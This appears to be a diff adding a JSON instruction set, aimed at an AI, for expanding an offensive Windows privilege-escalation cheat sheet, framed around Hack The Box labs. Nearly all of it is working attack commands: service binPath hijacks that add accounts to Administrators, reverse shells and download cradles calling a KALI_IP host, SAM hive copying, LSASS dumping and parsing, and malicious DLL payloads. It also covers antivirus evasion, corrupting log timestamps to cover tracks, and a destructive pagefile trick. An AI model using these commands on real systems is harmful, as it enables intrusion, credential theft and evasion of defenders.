@@ -1,0 +1,761 @@
+{
+  "meta": {
+    "title": "TokenPriv Operator — Comprehensive Enhancement Prompt",
+    "target_file": "token.html",
+    "author": "@Mahdiesta",
+    "version": "2.1",
+    "purpose": "AI instruction set for enhancing token.html with 100% shell compatibility, missing attack vectors, fallback chains, and accurate validated commands across all Windows shell environments",
+    "critical_lesson_from_session": "evil-winrm sends lines one at a time — multi-line PowerShell blocks break silently. Get-Service and sc query require SCM access. wmic alternatives needed for every context.",
+    "implemented_in_token_html": "v2.1 fully implemented — Server Operators rewrite, Quick Wins page, Shell Troubleshooting page, SeSystemtime page, 3 new CVEs, 4 missing allprivs table rows, SeDebug pypykatz + download, 5 new HTB writeups, DOMAIN+SVCNAME varbar, all shell compat headers",
+    "universal_sc_exe_rules": {
+      "rule1": "In PowerShell (including evil-winrm), 'sc' is aliased to Set-Content. ALWAYS use 'sc.exe' explicitly.",
+      "rule2": "binPath= MUST have a space before the value. 'binPath=\"...\"' (no space) = silent fail. Always: 'binPath= \"...\"'",
+      "rule3": "Error 1053 'service did not respond' is EXPECTED when payload is a short cmd — it ran, sc.exe timed out waiting for service handshake. Verify with net localgroup, not sc exit code.",
+      "rule4": "For maximum compatibility use fully qualified paths: C:\\Windows\\System32\\sc.exe config VSS binPath= \"C:\\Windows\\System32\\cmd.exe /c ...\""
+    }
+  },
+
+  "global_rules": {
+    "shell_compatibility_mandate": "Every code block MUST have a working variant for: (1) evil-winrm ruby, (2) evil-winrm-py Python, (3) cmd.exe, (4) PowerShell interactive, (5) constrained language mode PowerShell. Label each variant clearly.",
+    "one_liner_requirement": "For evil-winrm compatibility, ALL multi-line PowerShell MUST be collapsed into semicolon-separated one-liners OR wrapped in a .ps1 file upload pattern. Never present naked multi-line blocks without a one-liner alternative.",
+    "fallback_chain": "Every attack step MUST have: Primary method → Fallback A → Fallback B. No dead ends.",
+    "download_methods": "Every file transfer step MUST show ALL of: iwr/Invoke-WebRequest, certutil, bitsadmin, curl.exe (Win10+), wget alias, and SMB copy. Label which works in constrained mode.",
+    "error_handling": "Document exact error messages and their fix. 'Cannot open Service Control Manager' → use sc query directly. 'Get-Service failed' → use sc.exe. 'Access denied' on sc config → try different service.",
+    "restore_pattern": "Every attack that modifies system state MUST have a numbered REVERT step with one-liner restore command.",
+    "accuracy": "All commands validated against: Win Server 2019, Win10 21H2, Win11 22H2. Note OS-specific differences explicitly."
+  },
+
+  "sections_to_enhance": {
+
+    "server_operators": {
+      "priority": "CRITICAL",
+      "reason": "Validated gap from live HTB Return session — service enumeration failed, Get-Service failed, multi-line PS broke, VSS timed out. sc config worked but only on VSS.",
+      "current_gaps": [
+        "No shell-agnostic service enumeration (Get-Service fails without SCM perms in some contexts)",
+        "No 'find writable services' one-liner safe for evil-winrm",
+        "No fallback when sc start returns error 1053 (service did not respond to start)",
+        "Only one service target (AppMgmt) — needs full ranked list with original binPaths",
+        "Missing: add self to Administrators approach (no rev shell needed)",
+        "Missing: adduser.exe / adduser.bat approach (no listener needed)",
+        "Missing: PowerShell Invoke-Command workaround for when sc.exe space syntax confuses PS",
+        "Missing: How to handle 'sc config FAILED 5 Access is denied' (try different service)",
+        "Missing: registry-based binPath modification (when sc.exe itself is blocked)",
+        "Missing: original binPaths for all recommended services for proper restore",
+        "Missing: wmic service alternative when Get-Service blocked",
+        "Missing: evil-winrm-py specific quirks vs evil-winrm ruby"
+      ],
+      "commands_to_add": {
+        "service_enumeration_all_shells": {
+          "description": "Enumerate SYSTEM services that Server Operators can modify — works in ANY shell",
+          "variants": {
+            "evil_winrm_safe_oneliner": "sc.exe query state= all | findstr /i \"SERVICE_NAME\" | cmd /c for /f \"tokens=2 delims=: \" %i in ('sc.exe query state= all ^| findstr SERVICE_NAME') do @sc.exe qc %i 2>&1 | findstr /i \"access is denied\" > nul || echo CAN_MODIFY: %i",
+            "powershell_oneliner": "sc.exe query state= all | Select-String 'SERVICE_NAME' | ForEach-Object { $n=($_ -split ': ')[1].Trim(); $r=sc.exe qc $n 2>&1 | Out-String; if($r -notmatch 'Access is denied'){'OK: '+$n} }",
+            "upload_script_approach": "Upload check.ps1 then: powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\check.ps1",
+            "wmic_alternative": "wmic service where \"StartName='LocalSystem' and State='Running'\" get Name,PathName",
+            "cmd_batch": "for /f \"tokens=2 delims=: \" %i in ('sc.exe query state= all ^| findstr SERVICE_NAME') do @sc.exe qc %i 2>&1 | findstr /i \"FAILED 5\" > nul && echo DENIED: %i || echo OK: %i"
+          }
+        },
+        "service_target_list_with_binpaths": {
+          "description": "Ranked service targets with original binPaths for restore",
+          "services": [
+            {
+              "name": "VSS",
+              "full_name": "Volume Shadow Copy",
+              "original_binpath": "C:\\Windows\\System32\\vssvc.exe",
+              "default_state": "Stopped",
+              "notes": "Safe — stopped by default. Error 1053 on start is EXPECTED (payload cmd exits fast). Check with net localgroup after.",
+              "rank": 1
+            },
+            {
+              "name": "AppMgmt",
+              "full_name": "Application Management",
+              "original_binpath": "C:\\Windows\\system32\\dllhost.exe /ProcessID:{02D4B3F1-FD88-11D1-960D-00805FC79235}",
+              "default_state": "Running",
+              "notes": "Most stable for reverse shells — runs long enough. Stop first.",
+              "rank": 2
+            },
+            {
+              "name": "wbengine",
+              "full_name": "Block Level Backup Engine",
+              "original_binpath": "C:\\Windows\\system32\\wbengine.exe",
+              "default_state": "Stopped",
+              "notes": "Safe — stopped by default. Same 1053 timeout as VSS.",
+              "rank": 3
+            },
+            {
+              "name": "RasMan",
+              "full_name": "Remote Access Connection Manager",
+              "original_binpath": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
+              "default_state": "Stopped",
+              "notes": "Safe on most DCs. Stopped state. svchost services need special restore.",
+              "rank": 4
+            },
+            {
+              "name": "SNMPTRAP",
+              "full_name": "SNMP Trap",
+              "original_binpath": "C:\\Windows\\System32\\snmptrap.exe",
+              "default_state": "Stopped",
+              "notes": "Safe — obscure service, rarely monitored.",
+              "rank": 5
+            },
+            {
+              "name": "UPS",
+              "full_name": "Uninterruptible Power Supply",
+              "original_binpath": "C:\\Windows\\System32\\upsvc.exe",
+              "default_state": "Stopped",
+              "notes": "Rarely present but safe when it is.",
+              "rank": 6
+            }
+          ],
+          "services_to_avoid": ["LanmanServer (kills SMB session)", "WinRM (kills your shell)", "Netlogon (breaks domain auth)", "Spooler (visible + restarts fast)"]
+        },
+        "adduser_approach": {
+          "description": "Add svc-printer to Administrators — no listener required",
+          "steps": [
+            "sc.exe config VSS binPath= \"cmd /c net localgroup Administrators svc-printer /add\"",
+            "sc.exe stop VSS",
+            "sc.exe start VSS",
+            "REM Error 1053 is EXPECTED — command ran anyway",
+            "net localgroup Administrators",
+            "REM Verify svc-printer appears — then re-auth with evil-winrm as local admin"
+          ],
+          "verify": "net localgroup Administrators | findstr svc-printer",
+          "reauth": "evil-winrm -i TARGET -u svc-printer -p PASSWORD",
+          "notes": "Error 1053 'service did not respond' is NORMAL when binPath is a short cmd — the command executed successfully before sc.exe timeout. Always verify with net localgroup, not by checking sc start exit code."
+        },
+        "registry_approach": {
+          "description": "Modify service ImagePath via registry when sc.exe is blocked (needs SeRestorePrivilege also present)",
+          "steps": [
+            "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS /v ImagePath",
+            "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS /v ImagePath /t REG_EXPAND_SZ /d \"cmd /c net localgroup Administrators svc-printer /add\" /f",
+            "sc.exe stop VSS",
+            "sc.exe start VSS",
+            "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSS /v ImagePath /t REG_EXPAND_SZ /d \"C:\\Windows\\System32\\vssvc.exe\" /f"
+          ]
+        },
+        "reverse_shell_variants": {
+          "nc64_approach": {
+            "upload": "iwr http://KALI_IP:PORT/windows/nc64.exe -OutFile C:\\Windows\\Temp\\nc64.exe",
+            "binpath": "sc.exe config VSS binPath= \"cmd /c C:\\Windows\\Temp\\nc64.exe KALI_IP RPORT -e cmd\"",
+            "notes": "Reverse shell approach — needs listener"
+          },
+          "powershell_reverse": {
+            "binpath": "sc.exe config VSS binPath= \"powershell -nop -w hidden -e BASE64_ENCODED_REVERSE_SHELL\"",
+            "generate_b64_kali": "echo \"IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP:PORT/ps1/rev.ps1')\" | iconv -t UTF-16LE | base64 -w0",
+            "notes": "Useful when nc64.exe blocked by AV"
+          },
+          "msfvenom_exe": {
+            "generate": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=RPORT -f exe -o shell.exe",
+            "binpath": "sc.exe config VSS binPath= \"C:\\Windows\\Temp\\shell.exe\"",
+            "notes": "Clean shell — no cmd wrapper. Better for long sessions."
+          }
+        },
+        "error_1053_explanation": {
+          "title": "Understanding Error 1053 — NOT a failure",
+          "content": "sc start returns error 1053 ('service did not respond to start request') when the binary spawned by binPath exits before the service control manager timeout (~30s). When binPath is 'cmd /c net localgroup...', cmd executes the command and exits immediately. The command RAN — sc.exe just didn't get a service handshake back. ALWAYS verify with net localgroup or check for your reverse shell connection, not by the sc start exit code.",
+          "validation": "net localgroup Administrators",
+          "if_command_didnt_run": "Try a different service. Try AppMgmt or wbengine. Try adding a ping delay: cmd /c ping 127.0.0.1 -n 1 && net localgroup Administrators svc-printer /add"
+        },
+        "shell_specific_notes": {
+          "evil_winrm_ruby": {
+            "issue": "Sends each line independently — multi-line PS blocks fail with 'Missing closing }' errors",
+            "solution": "Use semicolons: $n='VSS'; sc.exe config $n binPath= 'cmd /c whoami > C:\\temp\\out.txt'; sc.exe stop $n; sc.exe start $n",
+            "upload_workaround": "Use 'upload localfile.ps1' then execute with 'powershell -ep bypass -file C:\\path\\file.ps1'"
+          },
+          "evil_winrm_py": {
+            "issue": "May have different SCM access behavior. sc query may fail with 'Cannot open Service Control Manager'",
+            "solution": "Use sc.exe qc SERVICE_NAME directly on known services rather than enumerating. sc.exe query state= all may work even when Get-Service fails.",
+            "alternative": "Switch to evil-winrm ruby if py version has SCM issues: evil-winrm -i TARGET -u USER -p PASS"
+          },
+          "cmd_exe": {
+            "notes": "Caret ^ needed for special chars in for loops. Use ^| instead of | in nested commands. No backtick — use ^ for line continuation.",
+            "sc_syntax": "In cmd.exe: sc config svc binPath= \"cmd /c command\" (double quotes work fine)"
+          },
+          "constrained_language_mode": {
+            "detection": "$ExecutionContext.SessionState.LanguageMode",
+            "if_constrained": "sc.exe, net.exe, cmd.exe all still work. Avoid PS object creation. Use direct executable calls only."
+          }
+        }
+      }
+    },
+
+    "all_sections_shell_compat": {
+      "priority": "HIGH",
+      "description": "Add a universal shell compatibility header to EVERY attack page",
+      "template": {
+        "section_name": "⚠️ Shell Compatibility — Read First",
+        "content": {
+          "evil_winrm": "Multi-line PS breaks — use one-liners or upload .ps1 files",
+          "constrained_ps": "If $ExecutionContext.SessionState.LanguageMode = ConstrainedLanguage — stick to exe calls",
+          "cmd_only": "If only cmd.exe available — use net.exe, sc.exe, reg.exe, certutil for all operations",
+          "no_iwr": "If Invoke-WebRequest blocked: certutil -urlcache -split -f URL OUTFILE or bitsadmin /transfer job /download /priority high URL OUTFILE or curl.exe URL -o OUTFILE (Win10+)"
+        }
+      }
+    },
+
+    "file_transfer_master": {
+      "priority": "HIGH",
+      "description": "Add to Detection Checklist page AND every section that uses file transfer — comprehensive download alternatives",
+      "methods": {
+        "powershell_iwr": {
+          "cmd": "iwr http://KALI_IP:PORT/file.exe -OutFile C:\\Windows\\Temp\\file.exe",
+          "alias": "Invoke-WebRequest -Uri http://KALI_IP:PORT/file.exe -OutFile C:\\Windows\\Temp\\file.exe",
+          "works_in": "PS 3+, evil-winrm, evil-winrm-py"
+        },
+        "certutil": {
+          "cmd": "certutil -urlcache -split -f http://KALI_IP:PORT/file.exe C:\\Windows\\Temp\\file.exe",
+          "works_in": "cmd.exe, PS, constrained mode — universal Windows fallback",
+          "note": "Leaves artifact in cache: certutil -urlcache -f http://KALI_IP:PORT/file.exe delete (cleanup)"
+        },
+        "bitsadmin": {
+          "cmd": "bitsadmin /transfer job /download /priority high http://KALI_IP:PORT/file.exe C:\\Windows\\Temp\\file.exe",
+          "works_in": "cmd.exe, PS — works on older Windows"
+        },
+        "curl_exe": {
+          "cmd": "curl.exe http://KALI_IP:PORT/file.exe -o C:\\Windows\\Temp\\file.exe",
+          "works_in": "Win10 1803+ and Server 2019+ — curl.exe ships by default",
+          "note": "Check: where curl.exe"
+        },
+        "smb_copy": {
+          "kali_setup": "impacket-smbserver share . -smb2support -username user -password pass",
+          "cmd": "copy \\\\KALI_IP\\share\\file.exe C:\\Windows\\Temp\\file.exe",
+          "net_use": "net use \\\\KALI_IP\\share /user:user pass && copy \\\\KALI_IP\\share\\file.exe C:\\Windows\\Temp\\",
+          "works_in": "cmd.exe — useful when HTTP blocked but SMB outbound allowed"
+        },
+        "webclient_downloadfile": {
+          "cmd": "(New-Object System.Net.WebClient).DownloadFile('http://KALI_IP:PORT/file.exe', 'C:\\Windows\\Temp\\file.exe')",
+          "works_in": "PS — alternative when iwr alias not available"
+        },
+        "evil_winrm_upload": {
+          "cmd": "upload /local/path/file.exe C:\\Windows\\Temp\\file.exe",
+          "note": "Only works inside evil-winrm session — fastest method when using evil-winrm"
+        }
+      }
+    },
+
+    "semanagevolume": {
+      "priority": "HIGH",
+      "gaps": [
+        "PrintConfig.dll trigger sometimes fails if Spooler has cached a prior load — need wbemcomn.dll and tzres.dll as true fallbacks with full steps",
+        "msfvenom DLLs flagged by Defender — need mingw-compiled custom DLL steps",
+        "AddUser DLL approach missing full restore steps",
+        "wbemcomn.dll section incorrectly mentioned iphlpsvc — must be corrected to wmiprvse.exe"
+      ],
+      "corrections": {
+        "wbemcomn_trigger": "wbemcomn.dll is loaded by wmiprvse.exe (WMI Provider Host). Trigger with: systeminfo OR Get-WmiObject Win32_OperatingSystem OR sc query. NOT iphlpsvc.",
+        "dll_hijack_priority_order": [
+          "1. PrintConfig.dll @ C:\\Windows\\System32\\spool\\drivers\\x64\\3\\ — trigger: CLSID {854A20FB-2D44-457D-992F-EF13785D2B51}",
+          "2. tzres.dll @ C:\\Windows\\System32\\wbem\\ — trigger: systeminfo",
+          "3. wbemcomn.dll @ C:\\Windows\\System32\\ — trigger: any WMI call (MANDATORY BACKUP before overwriting — file always exists)"
+        ]
+      },
+      "add_troubleshooting_section": {
+        "if_shell_is_garbled": "Use msfconsole multi/handler instead of raw nc — COM-hosted DLL payloads send Windows binary I/O that nc can't render",
+        "if_clsid_trigger_fails": "Restart spooler first: sc stop Spooler && sc start Spooler. Then retry CLSID trigger.",
+        "if_dll_blocked_by_av": "Use custom mingw DLL (see Alternative 5). AddUser variant is most reliable — no network, no AV trigger path."
+      }
+    },
+
+    "sebackupprivilege": {
+      "priority": "HIGH",
+      "gaps": [
+        "diskshadow CRLF requirement not clearly explained — silent failure on Unix LF files",
+        "Missing: robocopy /B one-liner for evil-winrm (robocopy works even when priv shows Disabled)",
+        "Missing: PSSession loopback workaround fully documented",
+        "Missing: winrs alternative to evil-winrm",
+        "diskshadow pwn.dsh CRLF fix needs both PS and cmd.exe variants"
+      ],
+      "add_commands": {
+        "crlf_fix_powershell": "[System.IO.File]::WriteAllText('C:\\Temp\\pwn.dsh', \"set context persistent nowriters`r`nadd volume c: alias pwn`r`ncreate`r`nexpose %pwn% z:`r`n\")",
+        "crlf_fix_cmd": "printf \"set context persistent nowriters\\r\\nadd volume c: alias pwn\\r\\ncreate\\r\\nexpose %%pwn%% z:\\r\\n\" > C:\\Temp\\pwn.dsh",
+        "robocopy_oneliner": "robocopy /b C:\\Windows\\System32\\config C:\\Temp SAM SYSTEM SECURITY",
+        "robocopy_note": "robocopy /B uses backup semantics internally — works even if SeBackupPrivilege shows Disabled in whoami /priv. The privilege is used at the filesystem level automatically.",
+        "winrs_alternative": "winrs -r:TARGET -u:DOMAIN\\USER -p:PASSWORD cmd",
+        "verify_priv_active": "whoami /priv | findstr /i SeBackup"
+      }
+    },
+
+    "seimpersonate_potato_section": {
+      "priority": "MEDIUM",
+      "gaps": [
+        "Missing: nc64.exe vs ncat vs netcat — which works on which Windows version",
+        "Missing: msfconsole handler as recommended replacement for raw nc with DLL payloads",
+        "Missing: how to check .NET version to pick correct GodPotato variant",
+        "Missing: what to do when all potatoes fail (OS too old, spooler off, no outbound)",
+        "JuicyPotato original CLSID list missing — needed when default fails",
+        "Missing: SigmaPotato full fileless PS reflection one-liner"
+      ],
+      "add_commands": {
+        "dotnet_version_check": "reg query 'HKLM\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' /s /v Version 2>nul | findstr /i version | sort /r | head -1",
+        "os_build_check": "cmd /c ver",
+        "spooler_check": "sc query spooler | findstr STATE",
+        "when_all_fail": "Try: (1) FullPowers first to recover stripped tokens, (2) SigmaPotato —no Spooler dep, (3) SweetPotato -e EfsRpc, (4) SharpEfsPotato, (5) Check if you can start Spooler: sc start Spooler",
+        "juicypotato_clsid_page": "https://github.com/ohpe/juicy-potato/tree/master/CLSID — filter by OS build and service account type",
+        "sigmapotato_fileless": "[Reflection.Assembly]::LoadFile('C:\\Temp\\SigmaPotato.exe'); [SigmaPotato]::Main('cmd /c KALI_IP RPORT -e cmd')"
+      }
+    },
+
+    "sedebug_section": {
+      "priority": "MEDIUM",
+      "gaps": [
+        "Missing: how to exfiltrate lsass.dmp back to Kali via evil-winrm download command",
+        "Missing: pypykatz as Kali-side parser (no need for Mimikatz on Kali)",
+        "Missing: lsass dump via Task Manager steps for RDP access",
+        "nanodump and NativeDump steps present but missing actual parse commands"
+      ],
+      "add_commands": {
+        "evil_winrm_download": "download C:\\Temp\\lsass.dmp /home/kali/lsass.dmp",
+        "pypykatz_parse": "pypykatz lsa minidump lsass.dmp",
+        "pypykatz_install": "pip3 install pypykatz",
+        "mimikatz_offline_parse": "mimikatz.exe \"sekurlsa::minidump lsass.dmp\" \"sekurlsa::logonpasswords\" \"exit\""
+      }
+    },
+
+    "dnsadmins_section": {
+      "priority": "MEDIUM",
+      "gaps": [
+        "CRITICAL: msfvenom DLL without DnsPluginInitialize export will crash dns.exe — this is documented but needs clearer fix",
+        "Missing: pre-built adduser dnsplugin.dll workflow",
+        "Missing: verify DNS restart worked (nslookup test)",
+        "Missing: how to find DC hostname when you don't know it",
+        "smb2support flag reason not explained — Win10/Server 2019 disable SMBv1 by default"
+      ],
+      "add_commands": {
+        "find_dc_hostname": "nltest /dclist:DOMAIN 2>nul || net group 'Domain Controllers' /domain || nslookup -type=NS DOMAIN",
+        "verify_dns_after_restart": "nslookup google.com DC_IP",
+        "dll_without_export_fix": "Use: msfvenom -p windows/x64/exec CMD='net user hacker P@ss123 /add && net localgroup administrators hacker /add' -f dll -o evil.dll (exec runs in DllMain — no export needed)",
+        "pre_built_dnsplugin": "github.com/dim0x69/dns-exe-persistance — provides a proper plugin DLL template",
+        "smb2support_reason": "SMBv1 disabled by default on Windows 10 1709+ and Server 2019+. Without -smb2support, impacket-smbserver uses SMBv1 only and the target cannot connect."
+      }
+    },
+
+    "backup_operators_section": {
+      "priority": "MEDIUM",
+      "gaps": [
+        "evil-winrm strips token warning is mentioned but fix not prominent enough",
+        "Missing: complete validate-then-attack flow for DC vs non-DC",
+        "Missing: what if diskshadow is not available (older Server)"
+      ],
+      "add_commands": {
+        "check_if_dc": "net group 'Domain Controllers' /domain | findstr %COMPUTERNAME%",
+        "if_not_dc": "Use robocopy /b for local SAM/SYSTEM — NTDS.dit only on DC",
+        "if_diskshadow_missing": "Use wbadmin: wbadmin start backup -backuptarget:\\\\KALI_IP\\share -include:c:\\windows\\ntds -quiet then copy from backup location",
+        "token_strip_fix_prominent": "STEP 0 ALWAYS: winrs -r:TARGET cmd OR New-PSSession -ComputerName localhost. Then verify: whoami /priv | findstr SeBackup shows Enabled before proceeding."
+      }
+    },
+
+    "cve_section": {
+      "priority": "MEDIUM",
+      "new_cves_to_add": [
+        {
+          "cve": "CVE-2021-1675 / CVE-2021-34527",
+          "name": "PrintNightmare",
+          "description": "Print Spooler RCE/LPE — load malicious DLL via AddPrinterDriverEx. Affects unpatched Win7-2019.",
+          "check": "sc query spooler | findstr STATE",
+          "poc": "github.com/cube0x0/CVE-2021-1675 (SharpPrintNightmare) or github.com/calebstewart/CVE-2021-1675 (PS)",
+          "command": ".\\SharpPrintNightmare.exe C:\\Windows\\Temp\\evil.dll",
+          "note": "Two variants: RCE (remote) and LPE (local). LPE needs local access + Spooler running."
+        },
+        {
+          "cve": "CVE-2022-26923",
+          "name": "Certifried",
+          "description": "AD CS machine account certificate abuse → domain privesc",
+          "check": "certipy find -username USER@DOMAIN -password PASS -dc-ip DC_IP",
+          "poc": "github.com/ly4k/Certipy",
+          "note": "Requires AD CS to be present. Affects unpatched Server 2019/2022."
+        },
+        {
+          "cve": "CVE-2023-28252",
+          "name": "Windows CLFS LPE",
+          "description": "Common Log File System driver LPE — no privileges needed",
+          "poc": "github.com/fortra/CVE-2023-28252",
+          "check": "wmic qfe get HotFixID | findstr KB5025221",
+          "note": "Patch: KB5025221 (April 2023). Affects Win10/11 and Server 2019/2022."
+        }
+      ]
+    },
+
+    "new_section_shell_troubleshooting": {
+      "priority": "HIGH",
+      "description": "Add a new page 'Shell Troubleshooting' covering all shell environments and their quirks",
+      "nav_entry": {
+        "section": "📋 Reference",
+        "label": "Shell Troubleshooting",
+        "page_id": "shellcompat"
+      },
+      "content": {
+        "evil_winrm_ruby_quirks": {
+          "multi_line_fix": "Collapse to one-liner with semicolons OR upload .ps1 file",
+          "example_broken": "$a = 1\\n$b = 2\\n$a+$b",
+          "example_fixed": "$a = 1; $b = 2; $a+$b",
+          "upload_pattern": "upload /local/file.ps1 C:\\Temp\\file.ps1 && powershell -ep bypass -file C:\\Temp\\file.ps1",
+          "get_service_fails": "Use sc.exe query state= all instead of Get-Service",
+          "scm_perms_fail": "sc.exe qc SERVICENAME works even when Get-Service fails — use direct service name queries"
+        },
+        "evil_winrm_py_quirks": {
+          "scm_access": "May fail with 'Cannot open Service Control Manager' for sc query/Get-Service — use sc.exe qc SERVICENAME directly on known services",
+          "switch_to_ruby": "If py version misbehaves: evil-winrm -i TARGET -u USER -p PASS (use ruby version)",
+          "upload_command": "upload localfile remotepath — same as ruby version"
+        },
+        "constrained_language_mode": {
+          "detect": "$ExecutionContext.SessionState.LanguageMode",
+          "restrictions": "No Add-Type, no .NET object creation, no [System.Reflection.Assembly]",
+          "workarounds": "Use .exe files directly. Use cmd.exe for complex operations. Use PowerShell -Version 2 if available (bypasses some CLM policies on older systems).",
+          "applocker_check": "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections"
+        },
+        "cmd_exe_only_cheatsheet": {
+          "download": "certutil -urlcache -split -f URL OUTFILE",
+          "check_privs": "whoami /priv",
+          "add_user": "net user USERNAME PASSWORD /add && net localgroup administrators USERNAME /add",
+          "service_hijack": "sc config SVCNAME binPath= \"cmd /c command\" && sc stop SVCNAME && sc start SVCNAME",
+          "check_groups": "net localgroup \"Group Name\"",
+          "run_ps_from_cmd": "powershell -nop -ep bypass -c \"COMMAND\""
+        }
+      }
+    },
+
+    "new_section_quick_wins": {
+      "priority": "MEDIUM",
+      "description": "Add 'Quick Wins' page — immediate checks after landing that take <60 seconds",
+      "nav_entry": {
+        "section": "Overview",
+        "label": "Quick Wins",
+        "page_id": "quickwins"
+      },
+      "checks_ordered_by_speed": [
+        {
+          "check": "1. whoami /all",
+          "time": "2s",
+          "look_for": "SeImpersonate, SeDebug, SeBackup, SeManageVolume, SeRestore, SeTakeOwnership, SeLoadDriver — any of these = instant path to SYSTEM"
+        },
+        {
+          "check": "2. whoami /groups | findstr /i 'admin\\|backup\\|dns\\|server op\\|print op'",
+          "time": "2s",
+          "look_for": "Any high-priv group membership"
+        },
+        {
+          "check": "3. net localgroup Administrators",
+          "time": "2s",
+          "look_for": "Are you already admin? Check before trying privesc."
+        },
+        {
+          "check": "4. systeminfo | findstr /i 'OS Version\\|Hotfix'",
+          "time": "5s",
+          "look_for": "Build number → CVE applicability. Missing KBs → kernel exploits."
+        },
+        {
+          "check": "5. wmic qfe get HotFixID",
+          "time": "5s",
+          "look_for": "Missing critical patches"
+        },
+        {
+          "check": "6. sc query spooler | findstr STATE",
+          "time": "2s",
+          "look_for": "Running → PrintSpoofer eligible (if SeImpersonate)"
+        },
+        {
+          "check": "7. icacls C:\\Windows\\System32\\config\\SAM",
+          "time": "2s",
+          "look_for": "BUILTIN\\Users:(RX) → HiveNightmare (CVE-2021-36934)"
+        },
+        {
+          "check": "8. cmd /c dir C:\\Users",
+          "time": "2s",
+          "look_for": "Other user home dirs you can read = credential artifacts"
+        }
+      ]
+    },
+
+    "allprivs_table_corrections": {
+      "priority": "LOW",
+      "corrections": [
+        "SeManageVolumePrivilege threat level should be CRITICAL not just listed as rare — it gives full C:\\ write",
+        "SeMachineAccountPrivilege: threat level should be MEDIUM in AD environments (MachineAccountQuota abuse → Kerberos attacks)",
+        "SeDelegateSessionUserImpersonatePrivilege: research shows it can be abused for cross-session token theft in some configs — mark as INVESTIGATE not UNKNOWN",
+        "SeAuditPrivilege: can be used to write fake events to Security log — useful for covering tracks — add wevtutil command"
+      ],
+      "missing_entries": [
+        {
+          "name": "SeNetworkLogonRight",
+          "type": "Right not privilege",
+          "note": "Not a Se* privilege but appears in policy — controls network logon access"
+        }
+      ]
+    },
+
+    "allprivs_missing_privileges": {
+      "priority": "HIGH",
+      "description": "These 4 privileges are MISSING from the All Privileges table AND from sidebar nav. All appeared in live HTB Return session whoami /all for svc-printer. Must be added to the table and given dedicated pages or inline documentation.",
+      "confirmed_missing": [
+        {
+          "name": "SeSystemtimePrivilege",
+          "display": "Change the system time",
+          "threat": "MEDIUM",
+          "appeared_in_user_session": true,
+          "attack": "Set system clock forward/backward → invalidate all active Kerberos tickets → break time-based auth → corrupt audit log timestamps → bypass certificate validity windows",
+          "tools": {
+            "set_time_cmd": "time HH:MM:SS",
+            "w32tm": "w32tm /config /manualpeerlist:KALI_IP /syncfromflags:manual /update && w32tm /resync /force",
+            "powershell": "Set-Date -Date '2099-01-01 00:00:00'",
+            "net_time": "net time \\\\DC /set /y"
+          },
+          "kerberos_break": "Set time >5 minutes off DC → all new Kerberos auth fails (KRB_AP_ERR_SKEW). Active tickets stay valid until expiry. Use to force NTLM fallback where NTLM relay is possible.",
+          "log_corruption": "Set time to past date → new events logged with past timestamp → blue team correlation broken",
+          "revert": "w32tm /config /syncfromflags:domhier /update && w32tm /resync /force",
+          "revert_cmd": "net time \\\\DC /set /y",
+          "notes": "ALWAYS revert time before leaving — Kerberos clock skew will lock you out of your own shell if you drift too far",
+          "page_to_add": true,
+          "page_id": "sesystemtime",
+          "nav_section": "Rare / Situational"
+        },
+        {
+          "name": "SeSystemProfilePrivilege",
+          "display": "Profile system performance",
+          "threat": "LOW",
+          "appeared_in_user_session": true,
+          "attack": "Access ETW (Event Tracing for Windows) performance data and kernel profiling APIs. Alone: low value. Combined with SeDebugPrivilege: read process memory via performance counters. Can be used to map running processes and their memory regions without triggering standard AV hooks.",
+          "tools": {
+            "xperf": "xperf -start MySession -on PROC_THREAD+LOADER+Profile -f C:\\Temp\\trace.etl",
+            "logman": "logman start MyTrace -p 'Windows Kernel Trace' (flags) -o C:\\Temp\\trace.etl -ets",
+            "powershell": "Get-Counter -Counter '\\Processor(_Total)\\% Processor Time' -SampleInterval 1 -MaxSamples 5"
+          },
+          "real_attack_path": "Combined with SeDebug: use NtQuerySystemInformation with SystemPerformanceInformation to read kernel memory statistics. Alone — add to table as LOW, note 'INVESTIGATE if SeDebug also present'.",
+          "page_to_add": false,
+          "add_to_table_only": true,
+          "nav_section": null,
+          "table_notes": "Low value alone. Check if SeDebugPrivilege also present — combined path exists for kernel memory reads via ETW."
+        },
+        {
+          "name": "SeCreatePagefilePrivilege",
+          "display": "Create a pagefile",
+          "threat": "LOW",
+          "appeared_in_user_session": true,
+          "attack": "Create or resize the Windows pagefile (virtual memory swap file). Primary abuse: (1) Force large pagefile to disk → unencrypted process memory written to pagefile.sys → if you can read pagefile.sys (via SeBackupPrivilege) extract credentials/secrets from it. (2) Shrink pagefile to 0 → force OS memory exhaustion → DoS (destructive). (3) Redirect pagefile to attacker-controlled path (rare/complex).",
+          "tools": {
+            "wmic_set": "wmic computersystem set AutomaticManagedPagefile=False && wmic pagefileset create name='C:\\pagefile.sys',initialSize=8192,maximumSize=8192",
+            "powershell": "Set-WmiInstance -Class Win32_PageFileSetting -Arguments @{name='C:\\pagefile.sys'; InitialSize=8192; MaximumSize=8192}",
+            "shrink_destructive": "wmic pagefileset delete — WARNING: removes pagefile, triggers BSOD on memory pressure",
+            "read_pagefile": "robocopy /b C:\\ C:\\Temp pagefile.sys (requires SeBackupPrivilege also)"
+          },
+          "chained_attack": "SeCreatePagefilePrivilege + SeBackupPrivilege → force all process memory to pagefile → read pagefile.sys → grep for credentials (lsass writes plaintext to pagefile on older systems without Credential Guard)",
+          "page_to_add": false,
+          "add_to_table_only": true,
+          "nav_section": null,
+          "table_notes": "Low solo value. Dangerous when chained with SeBackupPrivilege — pagefile.sys may contain LSASS credential material on systems without Credential Guard."
+        },
+        {
+          "name": "SeCreatePermanentPrivilege",
+          "display": "Create permanent shared objects",
+          "threat": "LOW",
+          "appeared_in_user_session": false,
